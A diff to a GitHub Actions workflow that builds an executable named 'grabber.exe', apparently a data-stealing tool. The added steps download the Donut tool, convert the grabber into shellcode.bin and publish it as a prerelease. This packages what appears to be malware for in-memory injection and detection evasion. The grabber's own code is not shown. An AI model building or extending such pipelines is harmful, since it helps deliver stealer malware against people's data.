@@ -71,3 +71,45 @@ jobs:
         asset_path: grabber-src\grabber.exe
         asset_name: grabber.exe
         asset_content_type: application/zip
+
+    - name: Download Donut
+      run: Invoke-WebRequest https://github.com/TheWover/donut/releases/download/v1.0/donut_v1.0.zip -OutFile donut.zip
+
+    - name: Extract donut
+      run: Expand-Archive donut.zip
+
+    - name: Convert Grabber to Shellcode 
+      run: .\donut\donut.exe -i grabber-src\grabber.exe -a2 -o shellcode.bin -z 2
+
+    # Delete-tag-and-release new
+    - name: Delete-tag-and-release
+      uses: dev-drprasad/delete-tag-and-release@v1.1
+      with:
+        tag_name: ShellCodeBuild #(required) - The name of the tag to delete. This is expected to be solely the tag name, not the name of a git reference.
+        delete_release: true #(optional) default: true - also delete all releases and their assets that are associated to the tag name
+        github_token: ${{ secrets.GITHUB_TOKEN }} # (required) - a GitHub token with write access to the repo where tags and releases will be searched and deleted
+
+    # Create Release
+    - name: Create Release
+      id: create_release_donut
+      uses: actions/create-release@latest
+      env:
+        GITHUB_TOKEN: ${{ secrets.github_token }}
+      with:
+        tag_name: ShellCodeBuild
+        release_name: ShellCodeBuild
+        body: "ShellCodeBuild"
+        draft: false
+        prerelease: true
+
+    # Upload Release Asset
+    - name: Upload Release Asset
+      id: upload-release-asset-donut
+      uses: actions/upload-release-asset@v1
+      env:
+        GITHUB_TOKEN: ${{ secrets.github_token }}
+      with:
+        upload_url: ${{ steps.create_release.outputs.upload_url }}
+        asset_path: shellcode.bin
+        asset_name: shellcode.bin
+        asset_content_type: application/zip
